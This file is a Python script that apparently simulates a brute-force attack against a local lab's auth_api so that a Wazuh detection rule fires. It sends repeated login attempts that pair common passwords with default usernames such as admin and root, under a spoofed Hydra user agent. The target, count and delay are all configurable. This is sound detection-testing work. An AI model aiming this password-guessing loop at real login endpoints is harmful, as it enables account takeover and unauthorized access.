"""
attack_brute_force.py — Hammer auth_api with bad credentials.

Run from your WSL2 host (or from another container). Will produce ~100 failed
login attempts in 30 seconds, which Wazuh rule 5712 will fire on as critical.

Usage:
    python attack_brute_force.py [--target http://localhost:5000] [--count 100]
"""

from __future__ import annotations

import argparse
import sys
import time

import requests


COMMON_PASSWORDS = [
    "password", "123456", "admin", "letmein", "qwerty", "monkey", "dragon",
    "football", "iloveyou", "welcome", "abc123", "trustno1", "1234567",
    "sunshine", "master", "shadow", "superman", "michael", "jordan",
    "harley", "ranger", "buster", "soccer", "hockey", "killer",
]

USERNAMES = ["admin", "root", "administrator", "user", "test"]


def run(target: str, count: int, delay: float) -> int:
    log_in = f"{target.rstrip('/')}/auth/login"
    print(f"[brute_force] target={log_in}, count={count}, delay={delay}s")

    successes = 0
    failures = 0
    errors = 0

    for i in range(count):
        user = USERNAMES[i % len(USERNAMES)]
        pw = COMMON_PASSWORDS[i % len(COMMON_PASSWORDS)]
        try:
            r = requests.post(
                log_in,
                json={"username": user, "password": pw},
                headers={"User-Agent": "hydra/9.5"},
                timeout=5,
            )
            if r.status_code == 200:
                successes += 1
            else:
                failures += 1
        except requests.RequestException as e:
            errors += 1
            print(f"[brute_force] error: {e}", file=sys.stderr)

        if (i + 1) % 10 == 0:
            print(f"[brute_force] {i + 1}/{count} (fail={failures} ok={successes} err={errors})")
        time.sleep(delay)

    print(f"[brute_force] DONE — {failures} failures, {successes} successes, {errors} errors")
    return 0


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://localhost:5000",
                   help="auth_api base URL (or nginx fronting it)")
    p.add_argument("--count", type=int, default=100, help="Number of login attempts")
    p.add_argument("--delay", type=float, default=0.2, help="Seconds between requests")
    args = p.parse_args()
    return run(args.target, args.count, args.delay)


if __name__ == "__main__":
    sys.exit(main())
